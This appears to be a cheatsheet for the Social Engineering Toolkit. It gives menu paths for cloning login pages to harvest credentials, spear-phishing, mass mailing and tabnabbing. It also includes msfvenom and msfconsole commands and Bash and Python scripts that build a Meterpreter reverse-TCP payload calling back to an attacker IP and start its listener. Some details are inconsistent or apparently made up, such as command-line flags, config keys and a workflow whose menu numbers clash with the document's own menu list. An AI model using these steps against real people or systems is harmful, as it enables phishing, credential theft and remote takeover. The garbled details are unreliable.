# Social Engineering Toolkit (SET) Cheatsheet

## Quick Start

```bash
# Start SET
setoolkit

# Command line mode
setoolkit -p "payload" -t "target" -o "output"
```

## Essential Commands

| Command | Description |
|---------|-------------|
| `setoolkit` | Start interactive menu |
| `setoolkit -p payload -t target` | Command line mode |
| `setoolkit -g` | Generate payloads |
| `setoolkit -v` | Version check |

## Menu Navigation

### Main Menu
```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
5) Update SET configuration
6) Help, Credits, and About
```

### Social-Engineering Attacks
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) SMS Spoofing Attack Vector
8) Wireless Access Point Attack Vector
9) QRCode Generator Attack Vector
10) Powershell Execution Attack Vector
11) Third Party Modules
```

### Website Attack Vectors
```
1) Java Applet Attack Method
2) Credential Harvester Attack Method
3) Tabnabbing Attack Method
4) Web Jacking Attack Method
5) Multi-Attack Web Method
```

## Common Workflow

### Credential Harvesting
```bash
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner
# Enter attacker IP
# Enter target URL
```

### Spear-Phishing
```bash
setoolkit
# 1) Social-Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# Select attack vector
```

### Payload Generation
```bash
setoolkit
# 1) Social-Engineering Attacks
# 4) Create a Payload and Listener
# Select payload type
```

### Mass Mailer
```bash
setoolkit
# 1) Social-Engineering Attacks
# 5) Mass Mailer Attack
# Configure email settings
```

## Quick Reference by Attack Type

### Website Clone Attack
```bash
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
2  # Credential Harvester Attack Method
2  # Site Cloner
# Enter attacker IP: 192.168.1.100
# Enter URL to clone: https://target.example.com/login
```

### Java Applet Attack
```bash
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
1  # Java Applet Attack Method
1  # Web Templates
# Enter attacker IP
```

### Tabnabbing Attack
```bash
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
3  # Tabnabbing Attack Method
# Enter attacker IP
```

### Infectious Media
```bash
setoolkit
1  # Social-Engineering Attacks
3  # Infectious Media Generator
1  # File-Format Exploits
# Select exploit
```

### QR Code Attack
```bash
setoolkit
1  # Social-Engineering Attacks
9  # QRCode Generator Attack Vector
# Enter URL to encode
```

## Payload Types

| Payload | Description | Platform |
|---------|-------------|----------|
| `windows/meterpreter/reverse_tcp` | Reverse TCP | Windows |
| `windows/meterpreter/bind_tcp` | Bind TCP | Windows |
| `windows/shell/reverse_tcp` | Reverse Shell | Windows |
| `linux/x86/meterpreter/reverse_tcp` | Reverse TCP | Linux |
| `java/meterpreter/reverse_tcp` | Reverse TCP | Java |
| `php/meterpreter/reverse_tcp` | Reverse TCP | PHP |
| `android/meterpreter/reverse_http` | Reverse HTTP | Android |

## Integration with Metasploit

```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Start listener
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

## Automation Scripts

### Bash Automation
```bash
#!/bin/bash
# Create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# Start listener
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
```

### Python Automation
```python
#!/usr/bin/env python3
import subprocess

# Generate payload
msfvenom_cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"
subprocess.run(msfvenom_cmd, shell=True)

# Start listener
msfconsole_cmd = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"'
subprocess.run(msfconsole_cmd, shell=True)
```

## Quick Reference by Scenario

### CTF Challenge
```bash
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
2  # Credential Harvester
2  # Site Cloner
# Enter target URL
# Send phishing link
# Collect credentials
```

### Penetration Test
```bash
# 1. Reconnaissance
theharvester -d target.example.com -b google

# 2. Create phishing campaign
setoolkit
1  # Social-Engineering Attacks
5  # Mass Mailer Attack

# 3. Monitor results
# 4. Document findings
```

### Red Team Operation
```bash
# 1. Research targets
# 2. Create pretext
# 3. Configure SET
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
2  # Credential Harvester
4  # Custom Import

# 4. Launch campaign
# 5. Collect data
# 6. Report findings
```

## Configuration

### Email Settings
```bash
# Edit SET configuration
setoolkit
5  # Update SET configuration

# Or edit directly
nano /etc/setoolkit/set_config
```

### Common Config Options
```
SET_EMAIL_PROVIDER = gmail
SET_EMAIL_ADDRESS = your@email.com
SET_EMAIL_PASSWORD = yourpassword
```

## Useful Aliases

```bash
# Add to ~/.bashrc
alias set='setoolkit'
alias setool='setoolkit'
alias setphish='setoolkit -p'
```

## Common Errors and Fixes

| Error | Solution |
|-------|----------|
| "Module not found" | Update SET: menu option 4 |
| "Permission denied" | Run with sudo |
| "Email not sending" | Check email settings in config |
| "Website not cloning" | Verify target URL is accessible |

## Quick Reference Table

| Task | Menu Path |
|------|-----------|
| Credential Harvest | 1 > 2 > 2 |
| Website Clone | 1 > 2 > 2 > 2 |
| Spear-Phish | 1 > 1 |
| Payload Gen | 1 > 4 |
| Mass Mail | 1 > 5 |
| QR Code | 1 > 9 |
| Infectious Media | 1 > 3 |
| Java Applet | 1 > 2 > 1 |
